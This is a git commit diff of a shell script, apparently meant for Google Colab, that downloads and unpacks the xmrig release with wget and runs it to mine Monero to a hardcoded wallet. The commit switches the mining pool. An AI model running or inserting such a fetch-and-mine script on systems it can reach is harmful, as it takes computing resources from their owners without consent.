b9595ac5bb496259ee64ee88997561589a5f96c6
FlarfGithub <84773791+FlarfGithub@users.noreply.github.com>
2022-09-02 17:50:05 +0300

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
 tar xvzf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig-6.17.0
-./xmrig --donate-level 5 -o xmrpool.eu:9999 -u 445zXmdPiWgCrqiobeVRzJgQk16xz1r6B3bDvGDaJAh5XetU1kseAPwg8qUG774ysQ6Z3jZ5JaDp98jhVfZap3N4B3FGun8 -k --tls
+./xmrig --donate-level 5 -o monerohash.com:9999 -u 445zXmdPiWgCrqiobeVRzJgQk16xz1r6B3bDvGDaJAh5XetU1kseAPwg8qUG774ysQ6Z3jZ5JaDp98jhVfZap3N4B3FGun8 -k --tls
